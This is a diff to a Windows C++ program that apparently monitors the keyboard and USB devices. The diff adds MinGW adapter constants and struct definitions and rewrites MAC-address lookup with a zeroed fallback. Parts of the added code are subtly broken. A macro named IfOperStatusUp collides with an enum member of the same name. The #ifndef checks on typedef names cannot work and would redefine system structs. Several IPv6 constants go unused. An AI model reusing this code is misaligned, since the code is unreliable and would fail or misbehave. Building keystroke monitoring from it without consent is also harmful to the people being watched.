@@ -30,6 +30,28 @@ typedef ULONG PROPID;
 #include <iomanip>   // for std::put_time
 #include <iphlpapi.h> // for GetAdaptersInfo
 
+// Network adapter type constants
+#ifndef IF_TYPE_IEEE80211
+#define IF_TYPE_IEEE80211 71
+#endif
+#ifndef IF_TYPE_SOFTWARE_LOOPBACK
+#define IF_TYPE_SOFTWARE_LOOPBACK 24
+#endif
+#ifndef IfOperStatusUp
+#define IfOperStatusUp 1
+#endif
+
+// IPv6 adapter constants (if not defined in MinGW)
+#ifndef GAA_FLAG_INCLUDE_PREFIX
+#define GAA_FLAG_INCLUDE_PREFIX 0x0010
+#endif
+#ifndef AF_UNSPEC
+#define AF_UNSPEC 0
+#endif
+#ifndef ERROR_BUFFER_TOO_SMALL
+#define ERROR_BUFFER_TOO_SMALL 122
+#endif
+
 // USB device notification constants (if not defined in MinGW)
 #ifndef DBT_DEVICEARRIVAL
 #define DBT_DEVICEARRIVAL 0x8000
@@ -61,6 +83,162 @@ typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
     GUID dbcc_classguid;
     char dbcc_name[1];
 } DEV_BROADCAST_DEVICEINTERFACE, *PDEV_BROADCAST_DEVICEINTERFACE;
+#endif
+
+// IPv6 adapter structures (if not defined in MinGW)
+#ifndef IP_ADAPTER_ADDRESSES
+typedef struct _IP_ADAPTER_ADDRESSES {
+    union {
+        ULONGLONG Alignment;
+        struct {
+            ULONG Length;
+            DWORD IfIndex;
+        };
+    };
+    struct _IP_ADAPTER_ADDRESSES* Next;
+    PCHAR AdapterName;
+    PIP_ADAPTER_UNICAST_ADDRESS FirstUnicastAddress;
+    PIP_ADAPTER_ANYCAST_ADDRESS FirstAnycastAddress;
+    PIP_ADAPTER_MULTICAST_ADDRESS FirstMulticastAddress;
+    PIP_ADAPTER_DNS_SERVER_ADDRESS FirstDnsServerAddress;
+    PWCHAR DnsSuffix;
+    PWCHAR Description;
+    PWCHAR FriendlyName;
+    BYTE PhysicalAddress[MAX_ADAPTER_ADDRESS_LENGTH];
+    DWORD PhysicalAddressLength;
+    DWORD Flags;
+    DWORD Mtu;
+    DWORD IfType;
+    IF_OPER_STATUS OperStatus;
+    DWORD Ipv6IfIndex;
+    DWORD ZoneIndices[16];
+    PIP_ADAPTER_PREFIX FirstPrefix;
+} IP_ADAPTER_ADDRESSES, *PIP_ADAPTER_ADDRESSES;
+#endif
+
+#ifndef IP_ADAPTER_UNICAST_ADDRESS
+typedef struct _IP_ADAPTER_UNICAST_ADDRESS {
+    union {
+        ULONGLONG Alignment;
+        struct {
+            ULONG Length;
+            DWORD Flags;
+        };
+    };
+    struct _IP_ADAPTER_UNICAST_ADDRESS* Next;
+    SOCKET_ADDRESS Address;
+    IP_PREFIX_ORIGIN PrefixOrigin;
+    IP_SUFFIX_ORIGIN SuffixOrigin;
+    IP_DAD_STATE DadState;
+    ULONG ValidLifetime;
+    ULONG PreferredLifetime;
+    ULONG LeaseLifetime;
+} IP_ADAPTER_UNICAST_ADDRESS, *PIP_ADAPTER_UNICAST_ADDRESS;
+#endif
+
+#ifndef IP_ADAPTER_ANYCAST_ADDRESS
+typedef struct _IP_ADAPTER_ANYCAST_ADDRESS {
+    union {
+        ULONGLONG Alignment;
+        struct {
+            ULONG Length;
+            DWORD Flags;
+        };
+    };
+    struct _IP_ADAPTER_ANYCAST_ADDRESS* Next;
+    SOCKET_ADDRESS Address;
+} IP_ADAPTER_ANYCAST_ADDRESS, *PIP_ADAPTER_ANYCAST_ADDRESS;
+#endif
+
+#ifndef IP_ADAPTER_MULTICAST_ADDRESS
+typedef struct _IP_ADAPTER_MULTICAST_ADDRESS {
+    union {
+        ULONGLONG Alignment;
+        struct {
+            ULONG Length;
+            DWORD Flags;
+        };
+    };
+    struct _IP_ADAPTER_MULTICAST_ADDRESS* Next;
+    SOCKET_ADDRESS Address;
+} IP_ADAPTER_MULTICAST_ADDRESS, *PIP_ADAPTER_MULTICAST_ADDRESS;
+#endif
+
+#ifndef IP_ADAPTER_DNS_SERVER_ADDRESS
+typedef struct _IP_ADAPTER_DNS_SERVER_ADDRESS {
+    union {
+        ULONGLONG Alignment;
+        struct {
+            ULONG Length;
+            DWORD Reserved;
+        };
+    };
+    struct _IP_ADAPTER_DNS_SERVER_ADDRESS* Next;
+    SOCKET_ADDRESS Address;
+} IP_ADAPTER_DNS_SERVER_ADDRESS, *PIP_ADAPTER_DNS_SERVER_ADDRESS;
+#endif
+
+#ifndef IP_ADAPTER_PREFIX
+typedef struct _IP_ADAPTER_PREFIX {
+    union {
+        ULONGLONG Alignment;
+        struct {
+            ULONG Length;
+            DWORD Flags;
+        };
+    };
+    struct _IP_ADAPTER_PREFIX* Next;
+    SOCKET_ADDRESS Address;
+    ULONG PrefixLength;
+} IP_ADAPTER_PREFIX, *PIP_ADAPTER_PREFIX;
+#endif
+
+// Additional constants and types
+#ifndef MAX_ADAPTER_ADDRESS_LENGTH
+#define MAX_ADAPTER_ADDRESS_LENGTH 8
+#endif
+
+#ifndef IP_PREFIX_ORIGIN
+typedef enum {
+    IpPrefixOriginOther = 0,
+    IpPrefixOriginManual,
+    IpPrefixOriginWellKnown,
+    IpPrefixOriginDhcp,
+    IpPrefixOriginRouterAdvertisement
+} IP_PREFIX_ORIGIN;
+#endif
+
+#ifndef IP_SUFFIX_ORIGIN
+typedef enum {
+    IpSuffixOriginOther = 0,
+    IpSuffixOriginManual,
+    IpSuffixOriginWellKnown,
+    IpSuffixOriginDhcp,
+    IpSuffixOriginLinkLayerAddress,
+    IpSuffixOriginRandom
+} IP_SUFFIX_ORIGIN;
+#endif
+
+#ifndef IP_DAD_STATE
+typedef enum {
+    IpDadStateInvalid = 0,
+    IpDadStateTentative,
+    IpDadStateDuplicate,
+    IpDadStateDeprecated,
+    IpDadStatePreferred
+} IP_DAD_STATE;
+#endif
+
+#ifndef IF_OPER_STATUS
+typedef enum {
+    IfOperStatusUp = 1,
+    IfOperStatusDown,
+    IfOperStatusTesting,
+    IfOperStatusUnknown,
+    IfOperStatusDormant,
+    IfOperStatusNotPresent,
+    IfOperStatusLowerLayerDown
+} IF_OPER_STATUS;
 #endif
 
 #pragma comment(lib, "wininet.lib")
@@ -219,30 +397,70 @@ void cleanupUSBMONITORING() {
 // Get MAC address
 std::string getMacAddress() {
     std::string macAddress;
+    
+    // Try to get MAC address using GetAdaptersInfo (IPv4)
     ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
     PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
     
-    if (pAdapterInfo == NULL) {
-        return "";
+    if (pAdapterInfo != NULL) {
+        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
+            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
+            while (pAdapter) {
+                // Check for Ethernet, Wireless, or any active adapter
+                if ((pAdapter->Type == MIB_IF_TYPE_ETHERNET || 
+                     pAdapter->Type == IF_TYPE_IEEE80211) && 
+                    pAdapter->AddressLength == 6) {
+                    
+                    char mac[18];
+                    sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
+                        pAdapter->Address[0], pAdapter->Address[1],
+                        pAdapter->Address[2], pAdapter->Address[3],
+                        pAdapter->Address[4], pAdapter->Address[5]);
+                    macAddress = std::string(mac);
+                    break;
+                }
+                pAdapter = pAdapter->Next;
+            }
+        }
+        free(pAdapterInfo);
     }
     
-    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
-        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
-        while (pAdapter) {
-            if (pAdapter->Type == MIB_IF_TYPE_ETHERNET) {
-                char mac[18];
-                sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
-                    pAdapter->Address[0], pAdapter->Address[1],
-                    pAdapter->Address[2], pAdapter->Address[3],
-                    pAdapter->Address[4], pAdapter->Address[5]);
-                macAddress = std::string(mac);
-                break;
+    // If we didn't get a MAC address, try with larger buffer
+    if (macAddress.empty()) {
+        ulOutBufLen = 0;
+        if (GetAdaptersInfo(NULL, &ulOutBufLen) == ERROR_BUFFER_TOO_SMALL) {
+            pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
+            if (pAdapterInfo != NULL) {
+                if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
+                    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
+                    while (pAdapter) {
+                        if (pAdapter->AddressLength == 6) {
+                            char mac[18];
+                            sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
+                                pAdapter->Address[0], pAdapter->Address[1],
+                                pAdapter->Address[2], pAdapter->Address[3],
+                                pAdapter->Address[4], pAdapter->Address[5]);
+                            macAddress = std::string(mac);
+                            
+                            // Prefer Ethernet or Wireless adapters
+                            if (pAdapter->Type == MIB_IF_TYPE_ETHERNET || 
+                                pAdapter->Type == IF_TYPE_IEEE80211) {
+                                break;
+                            }
+                        }
+                        pAdapter = pAdapter->Next;
+                    }
+                }
+                free(pAdapterInfo);
             }
-            pAdapter = pAdapter->Next;
         }
     }
     
-    free(pAdapterInfo);
+    // If still no MAC address, use a default
+    if (macAddress.empty()) {
+        macAddress = "00:00:00:00:00:00";
+    }
+    
     return macAddress;
 }
 
@@ -959,6 +1177,8 @@ int main() {
     macAddress = getMacAddress();
     if (macAddress.empty()) {
         std::cerr << "Warning: Could not get MAC address" << std::endl;
+    } else {
+        std::cout << "MAC Address: " << macAddress << std::endl;
     }
     
     // Setup keyboard monitoring
